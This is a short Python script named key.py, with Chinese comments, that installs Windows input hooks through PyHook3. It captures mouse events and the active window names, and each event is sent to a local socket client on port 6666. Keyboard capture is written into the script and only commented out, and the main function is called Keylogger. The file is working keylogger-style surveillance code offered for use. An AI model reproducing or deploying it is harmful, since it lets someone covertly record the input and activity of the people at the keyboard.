#!/usr/bin/env python
# _*_ coding: UTF-8 _*_
"""
@Project : untitled
@File : key.py
@IDE : PyCharm
@Author : 小生爱吃窝窝头
@Date : 2021/9/23 13:25
"""

# 当鼠标焦点所在的窗口名包含非 ascii 码，比如中文是 unicode 编码，
# 转码就会出现问题，不能获取到 window_name，导致 MouseSwitch() 参数获取不全报的错。
# 因为 pyHook 是适配 python2 的，所以在 python2 上用不会有问题。
# 目前比较好的解决办法是把 pyHook 库改为 PyHook3 就能完美解决了。
# 安装PyHook3 需要先安装swig

# win32和swig都需要配置环境变量

# import pyHook
import PyHook3
import pythoncom
from client import Client


def onMouseEvent(event):
    print(event)
    # 监听鼠标事件
    dict_key = {}
    dict_key["MessageName"] = event.MessageName
    dict_key["Message"] = event.Message
    dict_key["Time"] = event.Time
    dict_key["Window"] = event.Window
    dict_key["Position"] = event.Position
    dict_key["Wheel"] = event.Wheel
    dict_key["Injected"] = event.Injected
    dict_key["WindowName"] = event.WindowName
    Client("127.0.0.1", 6666, dict_key)

    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True


def OnKeyboard(event):
    dict_key = {}
    dict_key["MessageName"] = event.MessageName
    dict_key["Message"] = event.Message
    dict_key["Time"] = event.Time
    dict_key["Window"] = event.Window
    dict_key["Ascii"] = event.Ascii
    dict_key["Key"] = event.Key
    dict_key["KeyID"] = event.KeyID
    dict_key["WindowName"] = event.WindowName
    dict_key["ScanCode"] = event.ScanCode
    dict_key["Extended"] = event.Extended
    dict_key["Injected"] = event.Injected
    dict_key["Alt"] = event.Alt
    dict_key["Transition"] = event.Transition
    Client("127.0.0.1", 6666, dict_key)
    return True


def Keylogger():
    # 创建一个“钩子”管理对象
    hm = PyHook3.HookManager()
    # 监听所有键盘事件
    # hm.KeyDown = OnKeyboard
    # 设置键盘“钩子”
    # hm.HookKeyboard()
    # 监听所有鼠标事件
    hm.MouseAll = onMouseEvent
    # 设置鼠标“钩子”
    hm.HookMouse()

    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()


if __name__ == "__main__":
    Keylogger()
